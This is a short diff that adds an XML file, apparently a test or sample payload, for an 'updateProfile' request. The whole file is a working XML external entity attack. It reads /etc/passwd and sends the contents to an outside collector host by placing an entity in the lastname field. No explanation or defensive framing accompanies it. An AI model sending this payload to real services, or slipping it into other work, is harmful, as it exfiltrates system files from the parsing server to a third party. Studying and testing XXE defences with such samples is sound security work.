@@ -1,0 +1,8 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE updateProfile [
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY send SYSTEM 'https://collector.rodneybeede.com/?%file;'> ]>
+<updateProfile>
+<firstname>Joe</firstname>
+<lastname>&send;</lastname>
+</updateProfile>
